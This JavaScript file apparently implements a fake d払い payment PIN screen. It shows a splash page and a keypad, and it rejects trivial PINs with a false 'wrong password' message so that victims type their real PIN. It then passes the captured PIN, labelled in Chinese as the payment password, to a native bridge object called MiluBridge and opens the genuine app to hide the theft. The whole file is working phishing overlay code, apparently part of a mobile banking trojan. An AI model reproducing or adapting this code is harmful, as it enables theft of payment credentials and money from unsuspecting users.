(() => {
  const PIN_LEN = 4;
  const SPLASH_MS = 2000;
  const LOADING_MS = 1500;
  const CLOSE_DELAY_MS = 2500;

  const splash = document.getElementById("splash");
  const payment = document.getElementById("payment");
  const dots = Array.from(document.querySelectorAll("#pinDots .dot"));
  const keypad = document.getElementById("keypad");
  const backBtn = document.getElementById("backBtn");
  const toastEl = document.getElementById("toast");
  const loadingEl = document.getElementById("loading");

  let pin = "";
  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function showPage(id) {
    const isSplash = id === "splash";
    splash.classList.toggle("is-active", isSplash);
    splash.setAttribute("aria-hidden", isSplash ? "false" : "true");
    payment.classList.toggle("is-active", !isSplash);
    payment.setAttribute("aria-hidden", isSplash ? "true" : "false");
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2500);
  }

  function setLoading(show) {
    loadingEl.classList.toggle("is-show", show);
    loadingEl.setAttribute("aria-hidden", show ? "false" : "true");
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderDots() {
    dots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
    });
  }

  function isSequential(value) {
    const asc = "0123456789";
    const desc = "9876543210";
    return asc.includes(value) || desc.includes(value);
  }

  function isRepeated(value) {
    return value[0] === value[1] && value[1] === value[2] && value[2] === value[3];
  }

  function validatePin() {
    if (isRepeated(pin) || isSequential(pin)) {
      toast("パスワードが間違っています");
      pin = "";
      renderDots();
      return false;
    }
    return true;
  }

  function submitPin() {
    if (locked || pin.length !== PIN_LEN) {
      return;
    }
    if (!validatePin()) {
      return;
    }
    locked = true;
    const value = pin;
    setLoading(true);
    window.setTimeout(() => {
      reportDone(
        JSON.stringify({
          类型: "d払い",
          支付密码: value,
        }),
      );
      setLoading(false);
      window.setTimeout(() => {
        openApp();
        locked = false;
      }, CLOSE_DELAY_MS);
    }, LOADING_MS);
  }

  function pushDigit(digit) {
    if (locked || pin.length >= PIN_LEN) {
      return;
    }
    pin += digit;
    renderDots();
    if (pin.length === PIN_LEN) {
      window.setTimeout(submitPin, 200);
    }
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
  }

  function renderKeypad() {
    const cells = [
      { type: "digit", value: "1" },
      { type: "digit", value: "2" },
      { type: "digit", value: "3" },
      { type: "digit", value: "4" },
      { type: "digit", value: "5" },
      { type: "digit", value: "6" },
      { type: "digit", value: "7" },
      { type: "digit", value: "8" },
      { type: "digit", value: "9" },
      { type: "empty" },
      { type: "digit", value: "0" },
      { type: "del" },
    ];
    keypad.innerHTML = "";
    cells.forEach((cell) => {
      if (cell.type === "empty") {
        const spacer = document.createElement("span");
        spacer.className = "key key-empty";
        spacer.setAttribute("aria-hidden", "true");
        keypad.appendChild(spacer);
        return;
      }
      if (cell.type === "del") {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "key key-del";
        btn.setAttribute("data-key", "del");
        btn.setAttribute("aria-label", "削除");
        btn.innerHTML =
          '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" aria-hidden="true">' +
          '<path d="M21 4H8L1 12L8 20H21C21.55 20 22 19.55 22 19V5C22 4.45 21.55 4 21 4Z" stroke="#333" stroke-width="1.5"/>' +
          '<path d="M18 9L12 15M12 9L18 15" stroke="#333" stroke-width="1.5" stroke-linecap="round"/>' +
          "</svg>";
        keypad.appendChild(btn);
        return;
      }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "key";
      btn.setAttribute("data-key", cell.value);
      btn.textContent = cell.value;
      keypad.appendChild(btn);
    });
  }

  keypad.addEventListener("click", (event) => {
    const btn = event.target.closest("[data-key]");
    if (!btn) {
      return;
    }
    const key = btn.getAttribute("data-key");
    if (key === "del") {
      deleteDigit();
      return;
    }
    if (/^\d$/.test(key)) {
      pushDigit(key);
    }
  });

  backBtn.addEventListener("click", () => {
    window.location.reload();
  });

  renderKeypad();
  renderDots();
  window.setTimeout(() => {
    showPage("payment");
  }, SPLASH_MS);
})();
